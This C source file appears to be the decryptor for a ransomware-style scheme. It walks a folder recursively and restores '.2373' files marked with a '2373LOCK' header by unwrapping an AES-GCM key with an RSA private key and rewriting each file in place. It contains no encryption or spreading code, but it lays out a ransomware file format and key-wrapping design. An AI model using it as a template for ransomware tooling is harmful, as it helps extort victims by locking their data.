
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>

#include <openssl/evp.h>
#include <openssl/pem.h>

static const char MAGIC[8] = "2373LOCK";
#define MAGIC_LEN     8
#define RSA_BLOB_LEN  256
#define AES_KEY_LEN   32
#define GCM_NONCE_LEN 12
#define GCM_TAG_LEN   16
#define SEED_LEN      (AES_KEY_LEN + GCM_NONCE_LEN + 8)
#define EXT           ".2373"

static int rsa_oaep_decrypt(EVP_PKEY *priv,
                             const unsigned char *cipher, size_t cipher_len,
                             unsigned char *out, size_t *out_len) {
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(priv, NULL);
    int ok = 0;
    if (!ctx) return 0;
    if (EVP_PKEY_decrypt_init(ctx)                                 <= 0) goto done;
    if (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0) goto done;
    if (EVP_PKEY_CTX_set_rsa_oaep_md(ctx, EVP_sha256())           <= 0) goto done;
    if (EVP_PKEY_decrypt(ctx, out, out_len, cipher, cipher_len)   <= 0) goto done;
    ok = 1;
done:
    EVP_PKEY_CTX_free(ctx);
    return ok;
}

static int aes256gcm_decrypt(const unsigned char *key,    const unsigned char *nonce,
                               const unsigned char *cipher, size_t              cipher_len,
                               const unsigned char *tag,
                               unsigned char       *plain) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int len = 0, ok = 0;
    if (!ctx) return 0;
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)           != 1) goto done;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, GCM_NONCE_LEN, NULL) != 1) goto done;
    if (EVP_DecryptInit_ex(ctx, NULL, NULL, key, nonce)                         != 1) goto done;
    if (EVP_DecryptUpdate(ctx, plain, &len, cipher, (int)cipher_len)            != 1) goto done;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, GCM_TAG_LEN,
                              (void *)tag)                                       != 1) goto done;
    ok = (EVP_DecryptFinal_ex(ctx, plain + len, &len) > 0);
done:
    EVP_CIPHER_CTX_free(ctx);
    return ok;
}

static void decrypt_file(const char *path, EVP_PKEY *priv_key) {
    FILE *f = fopen(path, "rb");
    if (!f) return;

    fseek(f, 0, SEEK_END);
    long total = ftell(f);
    rewind(f);

    if (total < (long)(MAGIC_LEN + RSA_BLOB_LEN + GCM_TAG_LEN + 1)) {
        fclose(f);
        return;
    }

    char magic_buf[MAGIC_LEN];
    if (fread(magic_buf, 1, MAGIC_LEN, f) != MAGIC_LEN) {
        fprintf(stderr, "[!] Leitura do header falhou: %s\n", path);
        fclose(f);
        return;
    }
    if (memcmp(magic_buf, MAGIC, MAGIC_LEN) != 0) {
        fprintf(stderr, "[!] Header '2373LOCK' ausente, pulando: %s\n", path);
        fclose(f);
        return;
    }

    unsigned char rsa_blob[RSA_BLOB_LEN];
    if (fread(rsa_blob, 1, RSA_BLOB_LEN, f) != RSA_BLOB_LEN) {
        fprintf(stderr, "[!] Leitura do RSA blob falhou: %s\n", path);
        fclose(f);
        return;
    }

    size_t cipher_len = (size_t)(total - MAGIC_LEN - RSA_BLOB_LEN - GCM_TAG_LEN);
    unsigned char *cipher = malloc(cipher_len);
    if (!cipher) {
        fprintf(stderr, "[!] malloc falhou para cipher (%zu bytes): %s\n", cipher_len, path);
        fclose(f);
        return;
    }
    if (fread(cipher, 1, cipher_len, f) != cipher_len) {
        fprintf(stderr, "[!] Leitura do ciphertext falhou: %s\n", path);
        free(cipher);
        fclose(f);
        return;
    }

    unsigned char tag[GCM_TAG_LEN];
    if (fread(tag, 1, GCM_TAG_LEN, f) != GCM_TAG_LEN) {
        fprintf(stderr, "[!] Leitura do GCM tag falhou: %s\n", path);
        free(cipher);
        fclose(f);
        return;
    }
    fclose(f);

    unsigned char seed[SEED_LEN];
    size_t seed_len = SEED_LEN;
    if (!rsa_oaep_decrypt(priv_key, rsa_blob, RSA_BLOB_LEN, seed, &seed_len)) {
        fprintf(stderr, "[!] RSA descriptografia falhou: %s\n", path);
        fprintf(stderr, "    (chave privada incorreta ou arquivo corrompido)\n");
        free(cipher);
        return;
    }

    unsigned char aes_key[AES_KEY_LEN];
    unsigned char nonce[GCM_NONCE_LEN];
    uint64_t orig_size;
    memcpy(aes_key,    seed,                              AES_KEY_LEN);
    memcpy(nonce,      seed + AES_KEY_LEN,               GCM_NONCE_LEN);
    memcpy(&orig_size, seed + AES_KEY_LEN + GCM_NONCE_LEN, 8);

    unsigned char *plain = malloc(cipher_len);
    if (!plain) {
        memset(aes_key, 0, AES_KEY_LEN);
        memset(seed, 0, SEED_LEN);
        free(cipher);
        return;
    }

    int auth_ok = aes256gcm_decrypt(aes_key, nonce, cipher, cipher_len, tag, plain);

    memset(aes_key, 0, AES_KEY_LEN);
    memset(nonce,   0, GCM_NONCE_LEN);
    memset(seed,    0, SEED_LEN);
    free(cipher);

    if (!auth_ok) {
        fprintf(stderr, "[!] GCM tag inválida — arquivo adulterado ou corrompido: %s\n", path);
        memset(plain, 0, cipher_len);
        free(plain);
        return;
    }

    FILE *out = fopen(path, "wb");
    if (!out) {
        fprintf(stderr, "[!] Falha ao abrir para escrita: %s\n", path);
        memset(plain, 0, cipher_len);
        free(plain);
        return;
    }
    if (fwrite(plain, 1, (size_t)orig_size, out) != (size_t)orig_size) {
        fprintf(stderr, "[!] Escrita incompleta: %s\n", path);
        fclose(out);
        memset(plain, 0, cipher_len);
        free(plain);
        return;
    }
    fclose(out);
    printf("[+] Restaurado: %s\n", path);
    memset(plain, 0, cipher_len);
    free(plain);

    size_t plen = strlen(path);
    size_t elen = strlen(EXT);
    if (plen > elen && strcmp(path + plen - elen, EXT) == 0) {
        char old_name[2048];
        strncpy(old_name, path, plen - elen);
        old_name[plen - elen] = '\0';
        if (rename(path, old_name) != 0) {
            fprintf(stderr, "[!] rename falhou: %s → %s\n", path, old_name);
        }
    }
}

static void decrypt_dir(const char *dir_name, EVP_PKEY *priv_key) {
    struct dirent *entry;
    DIR *dp = opendir(dir_name);
    if (!dp) return;

    while ((entry = readdir(dp))) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        char full_path[2048];
        snprintf(full_path, sizeof(full_path), "%s/%s", dir_name, entry->d_name);

        struct stat st;
        if (lstat(full_path, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            decrypt_dir(full_path, priv_key);
        } else if (S_ISREG(st.st_mode) && strstr(entry->d_name, EXT)) {
            decrypt_file(full_path, priv_key);
        }
    }
    closedir(dp);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Uso: %s <chave_privada.pem> <pasta>\n\n", argv[0]);
        fprintf(stderr, "  chave_privada.pem  Chave privada RSA-2048 (PKCS#8 PEM)\n");
        fprintf(stderr, "  pasta              Diretório com arquivos .2373 a restaurar\n");
        return 1;
    }

    if (!OPENSSL_init_crypto(OPENSSL_INIT_LOAD_CRYPTO_STRINGS |
                             OPENSSL_INIT_ADD_ALL_CIPHERS     |
                             OPENSSL_INIT_ADD_ALL_DIGESTS, NULL)) {
        fprintf(stderr, "[!] Falha ao inicializar OpenSSL\n");
        return 1;
    }

    FILE *keyf = fopen(argv[1], "r");
    if (!keyf) {
        fprintf(stderr, "[!] Não foi possível abrir: %s\n", argv[1]);
        return 1;
    }
    EVP_PKEY *priv_key = PEM_read_PrivateKey(keyf, NULL, NULL, NULL);
    fclose(keyf);

    if (!priv_key) {
        fprintf(stderr, "[!] Chave privada inválida ou formato incorreto\n");
        return 1;
    }

    printf("[*] Iniciando restauração em: %s\n", argv[2]);
    decrypt_dir(argv[2], priv_key);
    EVP_PKEY_free(priv_key);
    printf("[+] Restauração concluída.\n");
    return 0;
}
